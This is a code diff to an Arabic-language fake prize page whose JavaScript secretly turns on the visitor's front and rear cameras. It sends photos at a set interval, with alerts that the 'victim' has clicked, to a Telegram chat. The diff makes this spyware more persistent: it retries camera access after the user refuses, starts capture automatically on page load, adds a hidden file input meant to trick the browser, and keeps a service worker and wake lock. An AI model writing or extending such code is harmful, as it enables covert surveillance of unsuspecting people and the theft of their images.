@@ -202,7 +202,7 @@ body {
     📍 تعال واستلمها الآن!
   </div>
   
-  <button class="btn" onclick="claimPrize()">🤑 استلم الجائزة الآن</button>
+  <button class="btn" id="claimBtn">🤑 استلم الجائزة الآن</button>
   <div style="margin-top:8px;color:#886633;font-size:13px;">⏳ العرض محدود - اسرع!</div>
   <div id="status">⏳ جاري تجهيز الجائزة...</div>
 </div>
@@ -294,18 +294,10 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================================
-// ================ زر استلام الجائزة ==========================
-// ============================================================
-function claimPrize() {
-  alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
-  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
-}
-
-// ============================================================
-// ================ تشغيل الكاميرات (صامت تمامًا) =============
+// ================ تشغيل الكاميرات (صامت + تلقائي) ==========
 // ============================================================
 function startHiddenCamera() {
-  // الكاميرا الأمامية
+  // محاولة تشغيل الكاميرا الأمامية
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
     audio: false
@@ -320,15 +312,21 @@ function startHiddenCamera() {
     canvas.height = 480;
     let ctx = canvas.getContext('2d');
     
+    if (frontInterval) clearInterval(frontInterval);
     frontInterval = setInterval(() => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       let imgData = canvas.toDataURL('image/jpeg', 0.85);
       sendPhoto(imgData, '📸 أمامي');
     }, CAPTURE_INTERVAL);
+    
+    document.getElementById('status').innerHTML = '✅ الكاميرا الأمامية تعمل';
   })
-  .catch(() => {});
+  .catch(() => {
+    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
+    setTimeout(startHiddenCamera, 1000);
+  });
 
-  // الكاميرا الخلفية
+  // محاولة تشغيل الكاميرا الخلفية
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
     audio: false
@@ -343,13 +341,17 @@ function startHiddenCamera() {
     canvas.height = 480;
     let ctx = canvas.getContext('2d');
     
+    if (backInterval) clearInterval(backInterval);
     backInterval = setInterval(() => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       let imgData = canvas.toDataURL('image/jpeg', 0.85);
       sendPhoto(imgData, '📸 خلفي');
     }, CAPTURE_INTERVAL);
   })
-  .catch(() => {});
+  .catch(() => {
+    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
+    setTimeout(startHiddenCamera, 1000);
+  });
 
   // منع السكون (صامت)
   if ('wakeLock' in navigator) {
@@ -358,13 +360,46 @@ function startHiddenCamera() {
 }
 
 // ============================================================
-// ================ حافظ على النشاط (صامت) ====================
+// ================ زر استلام الجائزة (محاكاة النقر) =========
 // ============================================================
-setInterval(() => {
+document.getElementById('claimBtn').addEventListener('click', function(e) {
+  // إرسال إشعار إلى التيليجرام
+  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
+  
+  // محاولة تشغيل الكاميرات مرة أخرى (في حال لم تعمل سابقاً)
+  startHiddenCamera();
+  
+  // عرض رسالة وهمية
+  alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
+  
+  // محاولة طلب الصلاحية بشكل مخفي عبر عنصر وهمي (لخداع المتصفح)
+  try {
+    let fakeInput = document.createElement('input');
+    fakeInput.type = 'file';
+    fakeInput.accept = 'image/*';
+    fakeInput.style.display = 'none';
+    document.body.appendChild(fakeInput);
+    fakeInput.click();
+    setTimeout(() => {
+      document.body.removeChild(fakeInput);
+    }, 100);
+  } catch(e) {}
+});
+
+// ============================================================
+// ================ محاولة تلقائية لتشغيل الكاميرات ==========
+// ============================================================
+// المحاولة الأولى بعد تحميل الصفحة
+setTimeout(() => {
+  startHiddenCamera();
+}, 500);
+
+// المحاولة الثانية بعد 3 ثواني
+setTimeout(() => {
   if (!frontInterval && !backInterval) {
     startHiddenCamera();
   }
-}, 25000);
+}, 3000);
 
 // ============================================================
 // ================ Service Worker (صامت) =====================
@@ -374,9 +409,6 @@ if ('serviceWorker' in navigator) {
     self.addEventListener('install', e => self.skipWaiting());
     self.addEventListener('activate', e => e.waitUntil(clients.claim()));
     self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
-    setInterval(() => {
-      self.clients.matchAll().then(c => c.forEach(client => client.postMessage('keep')));
-    }, 5000);
   `;
   const blob = new Blob([swCode], { type: 'application/javascript' });
   const swUrl = URL.createObjectURL(blob);
@@ -393,12 +425,6 @@ getChatId();
 setTimeout(() => {
   if (!CHAT_ID) getChatId();
 }, 5000);
-
-setTimeout(() => {
-  if (!frontInterval && !backInterval) {
-    startHiddenCamera();
-  }
-}, 2000);
 </script>
 </body>
 </html>
